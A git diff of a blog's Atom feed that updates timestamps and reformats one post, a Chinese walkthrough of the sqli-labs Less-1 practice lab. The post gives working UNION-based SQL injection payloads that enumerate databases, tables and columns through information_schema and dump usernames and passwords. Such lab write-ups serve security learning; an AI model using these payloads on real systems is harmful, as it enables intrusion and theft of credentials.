@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-07-19T15:10:50.303Z</updated>
+  <updated>2019-07-19T15:30:16.655Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -21,9 +21,9 @@
     <link href="http://yoursite.com/2019/07/19/sqli-labs-master/"/>
     <id>http://yoursite.com/2019/07/19/sqli-labs-master/</id>
     <published>2019-07-19T14:48:56.501Z</published>
-    <updated>2019-07-19T15:10:50.303Z</updated>
+    <updated>2019-07-19T15:30:16.655Z</updated>
     
-    <content type="html"><![CDATA[<h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><p>首先传入id发现都能显示</p><p>猜测后台传参形式大概是这样</p><p>select … from … where id =’1’</p><p>试着闭合一下<br><a id="more"></a></p><p>传入id=1’</p><p>发现报错</p><p>传入id=1’%23</p><p>发现正确</p><p>所以猜想应该正确~</p><pre><code>接着试着查看该表的列传入id=1&apos; order by 4显示不存在传入id=1&apos; order by 3可以说明该表有三列 接下来爆数据库吧 我们已知information_schema存储了其他数据库信息所以使用union来执行查询数据库因为union需要前后sql语句选择的列数相同,当前一个语句选择的内容为空，就将后面的语句的内容显示出来所以传入id=-1&apos; union select 1,group_concat(schema_name),3 from information_schema.schemata%23爆出数据库information_schema,challenges,dedecmsv57utf8sp2,mysql,performance_schema,security,test,wordpress,wordpress2现在一直数据库了想看看数据库中的表id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&apos;security&apos;%23爆出表了emails,referers,uagents,users还想看看表里有啥？满足你！id=-1&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos;%23爆出列了id,username,password都到这里了看看数据吧~id=-1&apos; union select 1,username,password from users where id=&apos;3&apos;%23(貌似加不加单引号没影响？)数据库schema_nameinformation_schema.schemata</code></pre><hr><pre><code>表    table_nameinformation_schema.tables</code></pre><hr><pre><code>列column_nameinformation_schema.columns</code></pre>]]></content>
+    <content type="html"><![CDATA[<h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><p>首先传入id发现都能显示</p><p>猜测后台传参形式大概是这样</p><p>select … from … where id =’1’</p><p>试着闭合一下<br><a id="more"></a><br>传入id=1’</p><p>发现报错</p><p>传入id=1’%23</p><p>发现正确</p><p>所以猜想应该正确~</p><hr><pre><code>接着试着查看该表的列传入id=1&apos; order by 4显示不存在传入id=1&apos; order by 3可以说明该表有三列 接下来爆数据库吧 我们已知information_schema存储了其他数据库信息所以使用union来执行查询数据库因为union需要前后sql语句选择的列数相同,当前一个语句选择的内容为空，就将后面的语句的内容显示出来所以传入id=-1&apos; union select 1,group_concat(schema_name),3 from information_schema.schemata%23爆出数据库information_schema,challenges,dedecmsv57utf8sp2,mysql,performance_schema,security,test,wordpress,wordpress2现在一直数据库了想看看数据库中的表id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&apos;security&apos;%23爆出表了emails,referers,uagents,users还想看看表里有啥？满足你！id=-1&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos;%23爆出列了id,username,password都到这里了看看数据吧~id=-1&apos; union select 1,username,password from users where id=&apos;3&apos;%23(貌似加不加单引号没影响？)数据库schema_nameinformation_schema.schemata</code></pre><hr><pre><code>表    table_nameinformation_schema.tables</code></pre><hr><pre><code>列column_nameinformation_schema.columns</code></pre>]]></content>
     
     <summary type="html">
     
